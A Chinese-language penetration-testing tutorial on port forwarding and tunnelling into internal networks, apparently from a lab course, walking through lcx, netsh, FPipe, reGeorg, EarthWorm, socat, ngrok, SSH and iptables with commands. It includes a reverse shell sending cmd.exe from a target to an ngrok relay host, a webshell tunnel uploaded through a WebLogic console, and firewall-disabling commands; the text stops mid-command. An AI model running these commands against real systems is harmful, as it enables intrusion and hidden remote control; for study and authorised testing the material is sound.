# 端口转发技术



#### 端口转发技术 <a id="-"></a>

**htran/lcx**

**1. 使用htran/lcx进行正向转发**

本机执行以下命令，将操作机的8888端口转发至目标机器的7001端口

```text
lcx.exe -tran 8888 101.198.180.144 7001
```

访问操作机的8888端口

![](https://p408.ssl.qhimgs4.com/t01018374280036e9a4.png)

**2. 使用htran/lcx进行反向转发**

操作机执行

```text
lcx.exe -listen 1234 8888
```

需上传lcx至靶机，并执行

```text
lcx.exe -slave 101.198.180.135 1234 127.0.0.1 7001
```

攻击机访问本机8888端口

![](https://p408.ssl.qhimgs4.com/t01ea2e7554e36425be.png)

**习题\(Weblogic反序列化工具\)：目标机器开启Weblogic端口后，不允许再登录目标机器。假设操作机与目标机之间存在防火墙，限制访问目标3389端口，如何远程过去？**

**3. Linux版本的lcx**

```text
gcc portmap.c -o lcx
```

![](https://p408.ssl.qhimgs4.com/t0127097c442d15dec5.png)

**netsh**

```text
netsh firewall show state 查看防火墙状态
# netsh firewall set opmode disable 关闭防火墙
# netsh firewall set opmode enable 启用防火墙
netsh advfirewall firewall add rule name="in" dir=in action=allow protocol=TCP localport=8080
netsh advfirewall firewall add rule name="out" dir=out action=allow protocol=TCP localport=8080
```

操作机以管理员身份运行运行，需根据实际需求改127.0.0.1的地址：

```text
netsh interface portproxy set v4tov4 listenaddress=127.0.0.1 listenport=3333 connectaddress=101.198.180.144 connectport=7001
```

访问3333端口

![](https://p408.ssl.qhimgs4.com/t017117a625efbcfa98.png)

查看现有规则

```text
netsh interface portproxy show all
```

删除转发规则

```text
netsh interface portproxy delete v4tov4 listenport=3333
```

**使用FPipe进行端口转发**

命令

```text
FPipe.exe -l 5555 -r 7001 101.198.180.144 -v
```

![](https://p408.ssl.qhimgs4.com/t01176c04cc91c8053b.png)

**使用reGeorg进行端口转发**

将tunnel.jsp压缩，并更改后缀名为war，通过weblogic后台上传至服务器

![](https://p408.ssl.qhimgs4.com/t01c554efa2fc7661ca.png)

本地运行reGeorgSocksProxy.py

![](https://p408.ssl.qhimgs4.com/t01d873b331bcd1dddc.png)

物理机运行代理

python reGeorgSocksProxy.py -p 2333 -u [http://101.198.180.144:7001/tunnel/tunnel.jsp](http://101.198.180.144:7001/tunnel/tunnel.jsp)

![](https://p408.ssl.qhimgs4.com/t01b05b1a942af01205.png)

本地使用Proxifier，配置代理服务器

![](https://p408.ssl.qhimgs4.com/t016445f234fd780fe4.png)

添加代理规则，将python.exe排除在外

![](https://p408.ssl.qhimgs4.com/t01486855a8c67128a3.png)

本地直接访问内网地址

![](https://p408.ssl.qhimgs4.com/t010c61e9ede18f843f.png)

**kali使用代理**

```text
vi proxychains.conf        //编辑配置文件
dynamic_chain            //取消此注释
socks5 127.0.0.1 7070    //添加代理
proxychains firefox
proxychains nmap -vvv -n -sT -PN -p 80 192.168.0.1-255
```

**使用rtcp进行转发**

Windows上监听端口

```text
nc.exe -nvv -lp 4444
```

Linux上使用rtcp转发

```text
python rtcp.py l:22 c:101.198.180.135:4444
```

Windows上已经接收到连接

![](https://p408.ssl.qhimgs4.com/t0102f88a669397573d.png)

使用场景

![](https://p408.ssl.qhimgs4.com/t01a98df1c421673137.png)

本地转发

```text
python rtcp.py l:4446 c:192.168.0.68:7001
```

访问Linux的4446端口

![](https://p408.ssl.qhimgs4.com/t01b61763c19c46db3d.png)

**ssh+putty转发**

安装putty

```text
apt-get install putty
```

打开putty，配置SSH

![](https://p408.ssl.qhimgs4.com/t01988fe224fb1b2e09.png)

配置SSH隧道

![](https://p408.ssl.qhimgs4.com/t019c5c7b95ccf65471.png)

连接SSH并登录，保持窗口不关闭

![](https://p408.ssl.qhimgs4.com/t01d988964c3cf7f3d2.png)

访问本机的8888端口：

![](https://p408.ssl.qhimgs4.com/t01046530e90ecca3bf.png)

**ssh+SecureCRT转发**

会话选项中设置：

![](https://p408.ssl.qhimgs4.com/t0102cdced57e0129c0.png)

连接本地的4444端口：

![](https://p408.ssl.qhimgs4.com/t01ea8378c44e60a4b0.png)

**socat转发**

安装socat

```text
apt-get install socat
```

添加转发规则

```text
socat TCP4-LISTEN:7777,reuseaddr,fork TCP4:192.168.0.92:7001
```

访问7777端口

![](https://p408.ssl.qhimgs4.com/t0199408fd819dca90d.png)

**EarthWorm**

![](https://p408.ssl.qhimgs4.com/t01d8174e19df665bae.png)

该工具共有 6 种命令格式（ssocksd、rcsocks、rssocks、lcx\_slave、lcx\_listen、lcx\_tran）。

![](https://p408.ssl.qhimgs4.com/t01525f06d8737dbf3a.png)

正向socks5代理

```text
ew_win32.exe -s  ssocksd -l 9999
```

![](https://p408.ssl.qhimgs4.com/t0162d8730388a6274e.png)

反向socks5代理

```text
相通机器：ew_win32.exe -s rcsocks -l 1080 -e 9999
目标主机：ew_win32.exe -s rssocks -d 1.1.1.1 -e 8888
```

**ngrok**

**下载与注册**

官网下载：[https://ngrok.com/](https://ngrok.com/)

口令至少10位

**本地注册**

```text
./ngrok authtoken 5Ed5CTPFzS3**********_**********1E3ubPjGUfM
```

**使用**

```text
./ngrok tcp 9999
```

**目标端**

```text
nc.exe 0.tcp.ngrok.io 14*** -e C:\Windows\System32\cmd.exe
```

**Linux端**

```text
nc -vv -l -p 9999
```

**iptables**

```text
echo 1 >/proc/sys/net/ipv4/ip_forward
iptables -t nat -A PREROUTING -p tcp --dport 8888 -j DNAT --to-destination 192.168.111.251:3389
iptables -t nat -A POSTROUTING -d 192.168.111.251 -p tcp --dport 3389 -j SNAT --to 192.168.111.41
```

查看规则：

```text
iptables -L -t nat
```

![](https://p408.ssl.qhimgs4.com/t0120fa8356b3c23ee2.png)

有些系统需要保存与重启，有些系统不需要：

```text
service iptables save
service iptables restart
```

直接访问192.168.111.41的8888端口

![](https://p408.ssl.qhimgs4.com/t01b2bab13ebd7a60bb.png)

删除规则：

```text
iptables -D INPUT 3  //删除input的第3条规则  
iptables -t nat -D POSTROUTING 1  //删除nat表中postrouting的第一条规则  
iptables -F INPUT   //清空 filter表INPUT所有规则  
iptables -F    //清空所有规则  
iptables -t nat -F POSTROU
```

